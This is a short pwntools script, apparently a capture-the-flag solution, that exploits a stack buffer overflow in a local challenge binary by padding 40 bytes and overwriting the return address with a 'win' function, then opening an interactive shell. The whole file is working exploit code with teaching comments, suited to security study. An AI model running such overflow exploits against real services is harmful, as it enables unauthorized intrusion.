from pwn import *

# 1. Set up the target
# Use process() for local testing
p = process('./chal')

# If you are connecting to a remote server (e.g., netcat), uncomment this:
# p = remote('IP_ADDRESS', PORT)

# Load the binary to get symbols automatically
elf = ELF('./chal')

# 2. Prepare the payload
# The address of the win function
win_address = elf.symbols['win']

# Calculate padding: 32 bytes buffer + 8 bytes Saved RBP
offset = 40

# Construct the payload
# b'A' * 40 fills the buffer and the RBP
# p64(...) converts the hex address into little-endian bytes format
payload = b'A' * offset + p64(win_address)

# 3. Send the payload
print(f"Sending payload to jump to: {hex(win_address)}")
p.sendline(payload)

# 4. Get the shell
p.interactive()